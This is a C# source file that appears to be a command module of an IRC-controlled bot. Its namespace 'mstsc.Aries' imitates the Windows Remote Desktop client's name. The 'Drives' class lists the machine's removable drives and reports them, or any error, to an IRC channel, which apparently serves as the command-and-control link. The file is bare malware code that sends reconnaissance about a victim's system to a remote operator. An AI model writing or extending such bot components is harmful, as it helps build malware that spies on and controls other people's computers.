using System;
using System.Collections;
using System.Collections.Generic;
using System.Text;
using System.IO;

namespace mstsc.Aries.Commands
{
sealed class Drives
    {
        public Drives()
        {
            try
            {
                ArrayList DriveArray = new ArrayList();
                foreach (DriveInfo Drive in DriveInfo.GetDrives())
                {
                    if ((Drive.DriveType == DriveType.Removable) && (Drive.IsReady))
                    {
                        DriveArray.Add(Drive.Name);
                    }
                }

                string Drives = "";
                foreach (string Drive in DriveArray)
                {
                    Drives += " " + Drive;
                }

                if (Drives.Length > 1)
                {
                    Main.Instance.IRCClient.MessageCurrentChannel("{Drives} " + Drives);
                }
                else
                {
                    Main.Instance.IRCClient.MessageCurrentChannel("{Drives} No removable drives found");
                }

                Drives = null;
                DriveArray.Clear();
                GC.Collect();
            }
            catch (Exception Exception)
            {
                Main.Instance.IRCClient.MessageCurrentChannel("{Drives} An error has occured: " + Exception.Message);
            }
        }
    }
}
